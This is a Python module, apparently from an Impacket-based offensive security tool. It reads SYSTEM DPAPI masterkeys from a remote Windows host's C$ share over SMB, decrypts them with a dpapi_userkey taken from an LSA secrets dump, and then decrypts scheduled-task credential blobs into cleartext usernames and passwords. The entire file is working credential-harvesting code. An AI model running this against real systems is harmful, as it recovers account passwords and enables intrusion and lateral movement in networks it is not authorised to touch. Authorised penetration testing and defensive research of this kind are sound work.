"""
DPAPI Credential Decryption for Scheduled Tasks

Decrypts DPAPI credential blobs using SYSTEM masterkeys. Based on the dploot
implementation and Impacket's DPAPI classes.

Scheduled task credentials use SYSTEM DPAPI context, requiring:
1. dpapi_userkey (from LSA secrets dump)
2. SYSTEM masterkey files (from C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\)
3. SYSTEM credential files (from C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\)

Workflow:
1. Extract dpapi_userkey from LSA secrets
2. Download and decrypt SYSTEM masterkey files
3. Download credential blobs
4. Decrypt credentials with decrypted masterkeys
"""

import contextlib
import logging
import ntpath
from binascii import unhexlify

from impacket.dpapi import (
    CREDENTIAL_BLOB,
    DPAPI_BLOB,
    CredentialFile,
    MasterKey,
    MasterKeyFile,
)
from impacket.smbconnection import SMBConnection as ImpacketSMBConnection
from impacket.uuid import bin_to_string

from ..utils.helpers import is_guid


class MasterkeyInfo:
    """Represents a decrypted DPAPI masterkey"""

    def __init__(self, guid: str, blob: bytes):
        self.guid = guid.lower()
        self.blob = blob
        self.key: bytes | None = None
        self._sha1: str | None = None

    def decrypt(self, dpapi_userkey: bytes) -> bool:
        """Decrypt masterkey using SYSTEM dpapi_userkey"""
        try:
            mkf = MasterKeyFile(self.blob)
            data = self.blob[len(mkf) :]

            if mkf["MasterKeyLen"] > 0:
                mk = MasterKey(data[: mkf["MasterKeyLen"]])

                # Try to decrypt with dpapi_userkey
                decrypted = mk.decrypt(dpapi_userkey)
                if decrypted:
                    self.key = decrypted
                    # Generate SHA1 hash for key
                    from hashlib import sha1

                    self._sha1 = sha1(self.key).hexdigest()
                    return True

            return False
        except Exception as e:
            logging.debug(f"Failed to decrypt masterkey {self.guid}: {e}")
            return False

    @property
    def sha1(self) -> str | None:
        """Return SHA1 hash of decrypted key"""
        return self._sha1

    def __str__(self) -> str:
        return f"{{{self.guid}}}:{self.sha1}" if self.key else f"{{{self.guid}}}:ENCRYPTED"


class ScheduledTaskCredential:
    """Represents a decrypted scheduled task credential"""

    def __init__(
        self,
        task_name: str,
        blob_path: str,
        username: str | None = None,
        password: str | None = None,
        target: str | None = None,
    ):
        self.task_name = task_name
        self.blob_path = blob_path
        self.username = username
        self.password = password
        self.target = target


def _decrypt_dpapi_blob(blob_bytes: bytes, masterkey: MasterkeyInfo) -> bytes | None:
    """
    Low-level DPAPI blob decryption using a decrypted masterkey.

    Shared by the online decryptor (DPAPIDecryptor.decrypt_credential_blob) and the
    offline looter path (looter._decrypt_credential_blob_offline). Returns the
    decrypted cleartext, or None on failure.
    """
    from Cryptodome.Cipher import AES, DES3
    from Cryptodome.Hash import HMAC, SHA1, SHA512
    from Cryptodome.Util.Padding import unpad

    try:
        blob = DPAPI_BLOB(blob_bytes)

        # CryptAlgo -> (key bits, cipher, mode, block size)
        ALGORITHMS_DATA = {
            0x6603: (168, DES3, DES3.MODE_CBC, 8),  # CALG_3DES
            0x6611: (128, AES, AES.MODE_CBC, 16),  # CALG_AES_128
            0x660E: (128, AES, AES.MODE_CBC, 16),  # CALG_AES_128 (alt)
            0x660F: (192, AES, AES.MODE_CBC, 16),  # CALG_AES_192
            0x6610: (256, AES, AES.MODE_CBC, 16),  # CALG_AES_256
        }
        HASH_ALGOS = {
            0x8004: SHA1,  # CALG_SHA1
            0x800E: SHA512,  # CALG_SHA_512
        }

        hash_algo = HASH_ALGOS.get(blob["HashAlgo"], SHA1)

        # Derive the session key from the masterkey SHA1 and the blob salt
        if masterkey.sha1 is None:
            return None
        key_hash = unhexlify(masterkey.sha1)
        session_key = HMAC.new(key_hash, blob["Salt"], hash_algo).digest()
        derived_key = blob.deriveKey(session_key)

        crypto_info = ALGORITHMS_DATA.get(blob["CryptAlgo"])
        if not crypto_info:
            logging.error(f"Unsupported crypto algorithm: {blob['CryptAlgo']:#x}")
            return None

        key_len, cipher_algo, mode, block_size = crypto_info
        cipher = cipher_algo.new(derived_key[: key_len // 8], mode=mode, iv=b"\x00" * block_size)
        cleartext = cipher.decrypt(blob["Data"])

        # Remove padding
        with contextlib.suppress(ValueError):
            cleartext = unpad(cleartext, block_size)

        return cleartext

    except Exception as e:
        logging.debug(f"Blob decryption failed: {e}")
        return None


def _parse_credential_blob(
    decrypted: bytes, blob_path: str, task_name: str = "", target: str | None = None
) -> ScheduledTaskCredential:
    """
    Parse a decrypted DPAPI CREDENTIAL_BLOB into a ScheduledTaskCredential.

    Shared by the online and offline credential paths. Extracts the task GUID from
    the Target field (only when task_name is not already known), the Username, and
    the password (stored in the Unknown3 field). Falls back to the provided target
    identifier when the blob carries no Target.
    """
    cred_blob = CREDENTIAL_BLOB(decrypted)

    # Target format: "Domain:batch=TaskScheduler:Task:{GUID}"
    target_str = None
    if cred_blob["Target"]:
        target_str = cred_blob["Target"].decode("utf-16-le", errors="ignore").rstrip("\x00")
        if "Task:{" in target_str and "}" in target_str:
            task_guid = target_str.split("Task:{")[1].split("}")[0]
            if not task_name:
                task_name = f"Task:{{{task_guid}}}"

    username = None
    password = None
    # Username field (not UserName!) holds domain\username in UTF-16LE
    if cred_blob["Username"]:
        username = cred_blob["Username"].decode("utf-16-le", errors="ignore").rstrip("\x00")
    # Password is stored in the Unknown3 field (UTF-16LE)
    if cred_blob["Unknown3"]:
        password = cred_blob["Unknown3"].decode("utf-16-le", errors="ignore").rstrip("\x00")

    return ScheduledTaskCredential(
        task_name=task_name, blob_path=blob_path, username=username, password=password, target=target_str or target
    )


class DPAPIDecryptor:
    """
    Decrypts DPAPI credential blobs from scheduled tasks using SYSTEM masterkeys
    """

    # SYSTEM profile paths
    SYSTEM_MASTERKEY_PATH = "Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User"
    SYSTEM_CREDENTIALS_PATH = "Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials"

    def __init__(self, smb_conn: ImpacketSMBConnection, dpapi_userkey: str):
        """
        Initialize DPAPI decryptor

        Args:
            smb_conn: Authenticated Impacket SMB connection
            dpapi_userkey: Hex-encoded SYSTEM dpapi_userkey from LSA dump
                          (e.g., "0x51e43225e5b43b25d3768a2ae7f99934cb35d3ea")
        """
        self.smb_conn = smb_conn

        # Parse dpapi_userkey
        if dpapi_userkey.startswith("0x"):
            dpapi_userkey = dpapi_userkey[2:]
        self.dpapi_userkey = unhexlify(dpapi_userkey)

        self.masterkeys: dict[str, MasterkeyInfo] = {}
        logging.info(f"Initialized DPAPI decryptor with userkey: {dpapi_userkey[:16]}...")

    def triage_system_masterkeys(self) -> list[MasterkeyInfo]:
        """
        Download and decrypt all SYSTEM masterkey files

        Returns:
            List of decrypted MasterkeyInfo objects
        """
        logging.info("Triaging SYSTEM masterkeys...")
        decrypted_keys = []

        try:
            # List masterkey files in SYSTEM profile
            files = self.smb_conn.listPath("C$", self.SYSTEM_MASTERKEY_PATH + "\\*")

            for file_info in files:
                filename = file_info.get_longname()

                # Skip . and ..
                if filename in [".", ".."]:
                    continue

                # GUID format check (masterkey files are named with GUIDs)
                if is_guid(filename):
                    guid = filename.lower()
                    filepath = ntpath.join(self.SYSTEM_MASTERKEY_PATH, filename)

                    logging.debug(f"Found SYSTEM masterkey: {guid}")

                    # Download masterkey file
                    try:
                        mk_bytes = self._read_file("C$", filepath)

                        if mk_bytes:
                            mk_info = MasterkeyInfo(guid=guid, blob=mk_bytes)

                            # Decrypt with dpapi_userkey
                            if mk_info.decrypt(self.dpapi_userkey):
                                self.masterkeys[guid] = mk_info
                                decrypted_keys.append(mk_info)
                                logging.info(f"Decrypted masterkey: {mk_info}")
                            else:
                                logging.debug(f"Failed to decrypt masterkey {guid}")

                    except Exception as e:
                        logging.debug(f"Error processing masterkey {guid}: {e}")

        except Exception as e:
            logging.error(f"Failed to triage SYSTEM masterkeys: {e}")

        logging.info(f"Decrypted {len(decrypted_keys)} SYSTEM masterkeys")
        return decrypted_keys

    def _read_file(self, share: str, path: str) -> bytes | None:
        """Read a file from SMB share using getFile"""
        try:
            import io

            buffer = io.BytesIO()
            self.smb_conn.getFile(share, path, buffer.write)
            return buffer.getvalue()
        except Exception as e:
            logging.debug(f"Failed to read file {share}\\{path}: {e}")
            return None

    def decrypt_credential_blob(
        self, blob_bytes: bytes, task_name: str, blob_path: str, target: str | None = None
    ) -> ScheduledTaskCredential | None:
        """
        Decrypt a DPAPI credential blob

        Args:
            blob_bytes: Raw credential file bytes
            task_name: Name of the scheduled task
            blob_path: Path to the blob on target system
            target: Target host identifier

        Returns:
            ScheduledTaskCredential object with decrypted username/password, or None if failed
        """
        try:
            # Try parsing as CredentialFile first (standard Windows credential format)
            # CredentialFile wraps a DPAPI blob inside a structured format
            try:
                cred_file = CredentialFile(blob_bytes)
                dpapi_blob_bytes = cred_file["Data"]
                logging.debug("Parsed as CredentialFile format")
            except Exception as e:
                # If CredentialFile parsing fails, treat as raw DPAPI blob
                dpapi_blob_bytes = blob_bytes
                logging.debug(f"Not a CredentialFile, treating as raw DPAPI blob: {e}")

            # Parse DPAPI blob to get masterkey GUID
            dpapi_blob = DPAPI_BLOB(dpapi_blob_bytes)
            masterkey_guid = bin_to_string(dpapi_blob["GuidMasterKey"]).lower()

            logging.debug(f"Credential blob requires masterkey: {masterkey_guid}")

            # Find corresponding masterkey
            mk_info = self.masterkeys.get(masterkey_guid)
            if not mk_info:
                logging.warning(f"Masterkey {masterkey_guid} not found for blob {blob_path}")
                return ScheduledTaskCredential(task_name=task_name, blob_path=blob_path, target=target)

            # Decrypt blob with masterkey, then parse the credential fields
            decrypted = _decrypt_dpapi_blob(dpapi_blob_bytes, mk_info)
            if not decrypted:
                logging.warning(f"Failed to decrypt blob {blob_path}")
                return ScheduledTaskCredential(task_name=task_name, blob_path=blob_path, target=target)

            cred = _parse_credential_blob(decrypted, blob_path, task_name, target)
            logging.info(f"Successfully decrypted credential for task: {cred.task_name}")
            return cred

        except Exception as e:
            logging.error(f"Error decrypting credential blob: {e}", exc_info=True)
            return ScheduledTaskCredential(task_name=task_name, blob_path=blob_path, target=target)
